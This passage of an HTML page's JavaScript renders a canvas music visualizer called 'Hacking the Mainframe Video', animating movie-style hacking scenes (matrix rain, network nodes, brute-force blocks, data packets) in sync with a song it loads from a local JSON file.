                    for (var di = 0; di < decryptCount; di++) {
                        var bi = Math.floor(Math.random() * cryptBlocks.length);
                        if (!cryptBlocks[bi].decrypted) {
                            cryptBlocks[bi].decrypted = true;
                            cryptBlocks[bi].flashTimer = 1;
                            cryptBlocks[bi].char = String.fromCharCode(65 + Math.floor(Math.random() * 26));
                        }
                    }
                    if (energy > 0.5) flashAlpha = 0.06;
                    titleGlitch = 0.5 + energy * 0.5;
                }

                if (sectionMood === 'access') {
                    // Celebrate
                    spawnPackets(10, W / 2, H / 2, W * Math.random(), H * Math.random(), CYAN);
                    flashAlpha = 0.1;
                }

                if (sectionMood === 'extraction') {
                    progressTarget = Math.min(1, progressTarget + 0.04);
                    // Data packets flowing out
                    spawnPackets(5, W * 0.5, H * 0.3, W * 0.1, H * 0.8, CYAN);
                    spawnPackets(3, W * 0.5, H * 0.3, W * 0.9, H * 0.2, GREEN);
                }

                if (sectionMood === 'trace') {
                    progressTarget = Math.min(1, progressTarget + 0.07);
                    traceLevel = Math.min(1, traceLevel + 0.05);
                    alarmPulse = 1;
                    if (energy > 0.4) {
                        spawnPackets(4, W * Math.random(), 0, W / 2, H / 2, RED);
                    }
                    titleGlitch = 0.8;
                }

                if (sectionMood === 'escape') {
                    progressTarget = Math.min(1, progressTarget + 0.1);
                    // Nodes going dark (un-compromising in reverse)
                    if (compromiseIndex > 0 && Math.random() > 0.3) {
                        compromiseIndex--;
                        if (compromiseIndex < nodes.length) {
                            nodes[compromiseIndex].compromised = false;
                        }
                    }
                    spawnPackets(8, W / 2, H / 2, W * Math.random(), H * Math.random(), GREEN);
                    flashAlpha = 0.1 + energy * 0.1;
                    titleGlitch = 1;
                }
            }

            lastBeat = beat;

            // ── Decay ──
            beatPulse *= Math.exp(-8 * dt);
            flashAlpha *= Math.exp(-6 * dt);
            sectionFlash *= Math.exp(-5 * dt);
            firewallFlash *= Math.exp(-4 * dt);
            alarmPulse *= Math.exp(-3 * dt);
            progressValue = lerpExp(progressValue, progressTarget, 5, dt);
            titleGlitch *= Math.exp(-3 * dt);

            if (accessTimer > 0) accessTimer -= dt;

            // Title visibility
            titleTarget = (sectionMood === 'bruteforce' || sectionMood === 'access' || sectionMood === 'escape') ? 1 : 0;
            titleAlpha = lerpExp(titleAlpha, titleTarget, 4, dt);

            // Terminal scroll
            var scrollMult = sectionMood === 'bruteforce' ? 3 : sectionMood === 'escape' ? 4 : 1;
            termScrollSpeed = 1 + energy * 2 * scrollMult;
            termY += termScrollSpeed * dt * 30;

            // Rain speed varies by section
            var rainSpeed = 0.5;
            if (sectionMood === 'recon') rainSpeed = 0.3;
            else if (sectionMood === 'scanning') rainSpeed = 0.6;
            else if (sectionMood === 'firewall') rainSpeed = 0.8 + energy * 0.5;
            else if (sectionMood === 'bruteforce') rainSpeed = 1.2 + energy;
            else if (sectionMood === 'access') rainSpeed = 0.4;
            else if (sectionMood === 'extraction') rainSpeed = 0.8;
            else if (sectionMood === 'trace') rainSpeed = 1.5 + energy;
            else if (sectionMood === 'escape') rainSpeed = 2 + energy * 2;

            // ── Draw scene layers (back to front) ──

            // 1. Matrix rain (background)
            var rainAlphaBase = 0.15;
            if (sectionMood === 'recon') rainAlphaBase = 0.4;
            else if (sectionMood === 'bruteforce' || sectionMood === 'escape') rainAlphaBase = 0.08;
            ctx.save();
            ctx.globalAlpha = rainAlphaBase;
            drawRain(ctx, energy, rainSpeed);
            ctx.restore();

            // 2. Section-specific visuals
            if (sectionMood === 'recon' || sectionMood === 'scanning') {
                // Network topology + scan
                drawNetwork(ctx, energy, beat);
                drawScan(ctx, energy);
            }

            if (sectionMood === 'firewall') {
                // Firewall barriers
                drawNetwork(ctx, energy * 0.3, beat);
                drawFirewall(ctx, energy);
            }

            if (sectionMood === 'bruteforce') {
                // Encryption breaking visualization
                drawCryptBlocks(ctx, energy);
            }

            if (sectionMood === 'access') {
                // Network fully lit up
                drawNetwork(ctx, energy, beat);
                drawAccessGranted(ctx);
            }

            if (sectionMood === 'extraction') {
                // Network + heavy packet flow
                drawNetwork(ctx, energy, beat);
            }

            if (sectionMood === 'trace' || sectionMood === 'escape') {
                // Network going dark, alerts
                drawNetwork(ctx, energy * 0.5, beat);
                drawTraceAlert(ctx);
            }

            if (sectionMood === 'outro') {
                // Fading network
                ctx.save();
                ctx.globalAlpha = Math.max(0, 1 - (elapsed - cursor.elapsed) * 0.1);
                drawNetwork(ctx, energy * 0.2, beat);
                ctx.restore();
            }

            // 3. Terminal overlay (all sections, varying intensity)
            var termAlpha = 0.15;
            if (sectionMood === 'recon') termAlpha = 0.6;
            else if (sectionMood === 'bruteforce') termAlpha = 0.3;
            else if (sectionMood === 'escape') termAlpha = 0.5;
            ctx.save();
            ctx.globalAlpha = termAlpha;
            drawTerminal(ctx, energy);
            ctx.restore();

            // 4. Data packets
            drawPackets(ctx, dt, energy);

            // 5. Progress bar
            drawProgressBar(ctx);

            // 6. Title
            drawTitle(ctx);

            // 7. Post-processing
            drawScanlines(ctx);
            drawVignette(ctx);
            drawFlash(ctx);
        }

        return {
            name: 'Hacking the Mainframe Video',
            init: init,
            render: render,
            resize: resize
        };
    })();

    // ── Page bootstrap ──
    (function() {
        var canvas = document.getElementById('viz-canvas');
        var overlay = document.getElementById('play-overlay');

        Visualizer.init(canvas);
        Visualizer.setRenderer('hacking-mainframe-video');

        function loadAndPlay(json) {
            Visualizer.loadSong(json);
            Visualizer.play();
        }

        function fetchSong() {
            var url = '../audio-tracker/songs/hacking-the-mainframe.json';
            if (window.fetch && location.protocol !== 'file:') {
                return fetch(url).then(function(r) { return r.json(); });
            }
            return new Promise(function(resolve, reject) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', url, true);
                xhr.onload = function() {
                    if (xhr.status === 200 || xhr.status === 0) {
                        resolve(JSON.parse(xhr.responseText));
                    } else {
                        reject(new Error('XHR failed: ' + xhr.status));
                    }
                };
                xhr.onerror = function() { reject(new Error('XHR error')); };
                xhr.send();
            });
        }

        overlay.addEventListener('click', function() {
            overlay.classList.add('hidden');
            fetchSong().then(loadAndPlay).catch(function(err) {
                console.error('Failed to load song:', err);
                overlay.classList.remove('hidden');
            });
        });

        canvas.addEventListener('click', function() {
            if (overlay.classList.contains('hidden')) {
                if (Visualizer.isPlaying()) {
                    Visualizer.stop();
                } else {
                    Visualizer.play();
                }
            }
        });
    })();
    </script>
</body>
</html>
